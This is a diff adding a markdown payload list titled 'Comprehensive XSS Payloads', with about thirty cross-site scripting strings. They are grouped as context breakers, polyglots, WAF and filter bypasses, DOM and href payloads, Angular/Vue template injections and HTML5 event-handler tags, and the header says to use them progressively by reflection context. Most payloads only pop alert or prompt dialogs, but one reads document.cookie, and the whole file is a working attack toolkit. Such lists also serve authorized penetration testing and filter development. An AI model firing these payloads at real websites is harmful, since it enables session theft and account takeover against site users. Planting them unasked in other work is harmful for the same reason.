@@ -1,0 +1,36 @@
+# Comprehensive XSS Payloads
+# Use these progressively depending on the reflection context
+
+## 1. Context Breakers
+'">><script>alert(1)</script>
+'"><img src=x onerror=alert(1)>
+javascript:alert(1);//
+"-prompt(1)-"
+'-prompt(1)-'
+\x3Cscript\x3Ealert(document.cookie)\x3C/script\x3E
+
+## 2. Polyglots (Multi-context bypasses)
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+'">><marquee><img src=x onerror=confirm(1)></marquee>"</plaintext\></|\><details/+/ontoggle=prompt`1`>
+
+## 3. WAF & Filter Bypasses
+<svg/onload=alert(1)>
+<svg/OnLoad="`${prompt``}`">
+<img src=x onerror=window["al"+"ert"](1)>
+<iframe src="javascript:alert(1)">
+<object data="javascript:alert(1)">
+
+## 4. DOM-based & Anchor/Href Contexts
+javascript:alert(1)
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=
+vbscript:msgbox("XSS")
+
+## 5. Angular/Vue specific
+{{constructor.constructor('alert(1)')()}}
+{{$on.constructor('alert(1)')()}}
+<div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view.window.document.body.children" ng-if="key == '0'">...</div>
+
+## 6. HTML5 & New Tags
+<details open ontoggle=alert(1)>
+<audio src/onerror=alert(1)>
+<video><source onerror=alert(1)>
